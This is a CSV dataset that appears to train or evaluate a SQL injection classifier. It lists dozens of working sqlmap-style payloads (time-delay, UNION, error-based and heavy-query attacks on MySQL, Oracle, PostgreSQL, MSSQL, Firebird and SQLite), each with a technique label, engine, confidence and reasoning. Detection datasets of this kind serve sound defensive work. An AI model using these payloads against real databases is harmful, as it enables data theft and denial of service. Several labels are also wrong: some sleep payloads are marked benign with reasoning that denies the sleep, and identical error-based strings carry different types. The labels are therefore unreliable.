id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23460,"1', ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",time_blind,oracle,0.90,Rule: dbms_pipe.receive_message() → time_blind (P5) Oracle; Both sources confirm; Oracle DB engine,2
23461,"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""utzr"" like ""utzr",heavy_query,mssql,0.85,Rule secondary: heavy_query (P4) with MSSQL sysusers Cartesian join; MSSQL DB,1
23462,"1"" ) as ebvt where 5305 = 5305",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23463,"-4055' ) ) as yoez where 3816 = 3816 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.80,Rule secondary: boolean condition; Generic DB,1
23464,"1 ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23465,"1%"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,heavy_query,oracle,0.85,Rule secondary: heavy_query (P4) with Oracle 5-way Cartesian join; Oracle DB,1
23466,"1'+ ( select 'hoqt' where 4877 = 4877 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.85,Rule secondary: heavy_query (P4) with Firebird Cartesian join; Firebird DB,1
23467,"select sleep ( 5 ) and ( 'vwmx' = 'vwmx",time_blind,mysql,0.90,Rule: sleep() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23468,"1' ) ) )",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23469,"1%"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,Rule: generate_series(1,5000000) → heavy_query (P4) PostgreSQL; Both sources confirm; PostgreSQL DB,2
23470,"1 ) ) union all select null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23471,"1"" where 5216 = 5216 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Rule secondary: heavy_query (P4) with Oracle Cartesian; Oracle DB,1
23472,"1'|| ( select 'neqi' where 6873 = 6873 union all select null,null,null,null,null,null,null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23473,"-5268' ) where 5615 = 5615 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.80,Rule secondary: boolean + MSSQL char() encoding; Generic DB,1
23474,"1' ) as xbsc where 6772 = 6772",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23475,"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- lxey",heavy_query,firebird,0.85,Rule secondary: heavy_query (P4) with Firebird Cartesian; Firebird DB,1
23476,"select sleep ( 5 ) and 'yzix' = 'yzix",time_blind,mysql,0.90,Rule: sleep() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23477,"1'+ ( select 'hhnz' where 2465 = 2465,",boolean_blind,generic,0.75,Rule secondary: boolean condition; Generic DB,1
23478,"1'|| ( select 'kzkr' from dual where 2778 = 2778,",boolean_blind,oracle,0.80,Rule secondary: boolean; Oracle from dual; Oracle DB,1
23479,"1"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""opdl"" = ""opdl",error_based,mysql,0.90,Rule: updatexml() → error_based (P4) MySQL; Both sources confirm; XPath injection pattern; MySQL DB,2
23480,"select count ( * ) from generate_series ( 1,5000000 ) and ""ihbe"" like ""ihbe",heavy_query,postgresql,0.90,Rule: generate_series(1,5000000) → heavy_query (P4) PostgreSQL; Both sources confirm; PostgreSQL DB,2
23481,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'lbwh' = 'lbwh",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4); Heuristic secondary on elt(); MySQL DB,1
23482,"1%"" and sleep ( 5 ) and ""%"" = """,time_blind,mysql,0.90,Rule: sleep() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23483,"-2125"" ) ) or 8571 = 8571--",boolean_blind,generic,0.85,Rule: 'or 8571 = 8571' → boolean_blind (P3); Both sources confirm; Generic DB,2
23484,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",time_blind,oracle,0.90,Rule: dbms_pipe.receive_message() → time_blind (P5) Oracle; Both sources confirm; Oracle DB engine,2
23485,"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""ekjs"" like ""ekjs",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4); Heuristic secondary on elt(); MySQL DB,1
23486,"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""ymwb"" = ""ymwb",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4); Heuristic secondary on elt(); MySQL DB,1
23487,"-1634%' union all select 5937,5937,5937,5937--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23488,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'clhg' = 'clhg",boolean_blind,firebird,0.85,Rule secondary: boolean + Firebird rdb$* Cartesian; Firebird DB,1
23489,"1%"" union all select null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23490,"select ( case when ( 1354 = 7529 ) then 1354 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--",boolean_blind,oracle,0.85,Rule secondary: boolean; Oracle from dual; Oracle DB,1
23491,"1' and elt ( 3114 = 3114,sleep ( 5 ) ) #",benign,generic,0.70,Rule: no attack signal; elt() MySQL conditional without sleep injection; Generic DB,2
23492,"1' in boolean mode ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Rule secondary: heavy_query (P4) with Oracle Cartesian; Oracle DB,1
23493,"1 ) where 1527 = 1527 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.90,Rule: pg_sleep() → time_blind (P5) PostgreSQL; Both sources confirm; PostgreSQL DB,2
23494,"1%"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",benign,generic,0.70,Rule: no attack signal; elt() MySQL conditional; Generic DB,2
23495,"1' ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,Rule: generate_series(1,5000000) → heavy_query (P4) PostgreSQL; Both sources confirm; PostgreSQL DB,2
23496,"1%"" union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23497,"-7637"" union all select 8498,8498,8498--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23498,"1"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""oyfk"" = ""oyfk",error_based,mysql,0.85,Rule secondary: exp() overflow → error_based (P4) MySQL; Both sources confirm; MySQL pattern,1
23499,"1 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,Rule secondary: heavy_query (P4) with large number (500000000); SQLite randomblob; SQLite DB,1
23500,"1%"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""%"" = """,error_based,mysql,0.85,Rule secondary: exp() overflow → error_based (P4) MySQL; Both sources confirm; MySQL pattern,1
23501,"1 where 9752 = 9752",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23502,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'zurf' = 'zurf",time_blind,mysql,0.90,Rule: benchmark() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23503,"1'|| ( select 'yezk' where 2097 = 2097,",boolean_blind,generic,0.75,Rule secondary: boolean condition; Generic DB,1
23504,"1%' rlike sleep ( 5 ) and '%' = '",time_blind,mysql,0.90,Rule: sleep() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23505,"1' where 8860 = 8860 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.90,Rule: extractvalue() → error_based (P4) MySQL; Both sources confirm; MySQL DB engine,2
23506,"1%"" ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23507,"1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),",error_based,oracle,0.85,Rule: utl_inaddr function → error_based (P4) Oracle; Both sources confirm error signal; Oracle DB,2
23508,"-2745' or elt ( 1032 = 1032,3623 )",benign,generic,0.70,Rule: no attack signal; elt() MySQL conditional; Generic DB,2
23509,"1' ) ) ) and 8162 = 1687 and ( ( ( 'tdyr' like 'tdyr",boolean_blind,generic,0.85,Rule: 'and 8162 = 1687' → boolean_blind (P3); Both sources confirm; Generic DB,2
23510,"( case when 8422 = 8452 then 1 else null end )",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23511,"-9256"" ) ) union all select 2977,2977,2977,2977,2977,2977,2977--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23512,"1"" ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,Rule: generate_series(1,5000000) → heavy_query (P4) PostgreSQL; Both sources confirm; PostgreSQL DB,2
23513,"-3758' ) ) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23514,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'zjnp' = 'zjnp",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4); Heuristic secondary on elt(); MySQL DB,1
23515,"select count ( * ) from generate_series ( 1,5000000 ) and ( ""kngx"" like ""kngx",heavy_query,postgresql,0.90,Rule: generate_series(1,5000000) → heavy_query (P4) PostgreSQL; Both sources confirm; PostgreSQL DB,2
23516,"1' in boolean mode ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.90,Rule: benchmark() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23517,"1'|| ( select 'zeet' from dual where 9567 = 9567 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.90,Rule: pg_sleep() → time_blind (P5) PostgreSQL; Both sources confirm; PostgreSQL DB engine,2
23518,"1"" ) where 1410 = 1410",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23519,"1%' ) and 2006 = 2006",boolean_blind,generic,0.85,Rule: 'and 2006 = 2006' → boolean_blind (P3); Both sources confirm; Generic DB,2
23520,"-2530%' order by 1#",benign,generic,0.70,Rule: no SQLi signal; ORDER BY insufficient; Generic DB,2
23521,"1 ) as svkf where 6503 = 6503 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.85,Rule secondary: large number (500000000) → heavy_query (P4); Boolean secondary; Generic DB,1
23522,"select ( case when ( 2751 = 8206 ) then 2751 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--",boolean_blind,oracle,0.85,Rule secondary: boolean; Oracle from dual; Oracle DB,1
23523,"1'+ ( select gguu where 7809 = 7809 union all select null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23524,"-6512'+ ( select 'zdjx' where 5454 = 5454 order by 1--",boolean_blind,generic,0.75,Rule secondary: boolean condition; ORDER BY secondary; Generic DB,1
23525,"1%"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""%"" = """,error_based,mysql,0.90,Rule: updatexml() → error_based (P4) MySQL; Both sources confirm; MySQL DB engine,2
23526,"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,oracle,0.85,Rule secondary: heavy_query (P4) with Oracle Cartesian; Oracle DB,1
23527,"1%' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and '%' = '",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4); MySQL patterns; MySQL DB,1
23528,"1%"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,heavy_query,sqlite,0.85,Rule secondary: heavy_query (P4) with SQLite randomblob large number; SQLite DB,1
23529,"select ( case when ( 9434 = 2780 ) then 9434 else 9434* ( select 9434 from information_schema.character_sets ) end ) #",error_based,mysql,0.85,Rule secondary: error on multiplication in CASE; MySQL DB from information_schema; MySQL DB,1
23530,"1 where 6365 = 6365",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23531,"1' ) ) ) union all select null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23532,"-3749"" or elt ( 1032 = 1032,3623 ) and ""mzrw"" = ""mzrw",benign,generic,0.70,Rule: no attack signal; elt() MySQL conditional; Generic DB,2
23533,"if ( 9770 = 9748 ) select 9770 else drop function zyuo--",boolean_blind,generic,0.75,Rule secondary: boolean + IF statement; Generic DB,1
23534,"1' ) and make_set ( 7187 = 4625,4625 ) and ( 'diai' like 'diai",benign,generic,0.70,Rule: no attack signal; make_set() MySQL conditional; Generic DB,2
23535,"end ) ||'",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23536,"-3370' in boolean mode ) union all select 3432,3432,3432,3432#",union_based,oracle,0.90,Rule: UNION SELECT → union_based (P7); Oracle DB from context; Oracle DB engine,2
23537,"1' ) ) as fwxq where 9935 = 9935 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.85,Rule secondary: exp() overflow → error_based (P4) MySQL; Both sources confirm; MySQL DB,1
23538,"1 ) where 2679 = 2679 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.85,Rule secondary: heavy_query (P4) with Firebird Cartesian; Firebird DB,1
23539,"1%"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.90,Rule: sleep() → time_blind (P5) MySQL; Both sources confirm; MySQL DB engine,2
23540,"1%"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,boolean_blind,generic,0.80,Rule secondary: boolean + MSSQL convert(); Generic DB,1
23541,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.90,Rule: extractvalue() → error_based (P4) MySQL; Both sources confirm; MySQL DB engine,2
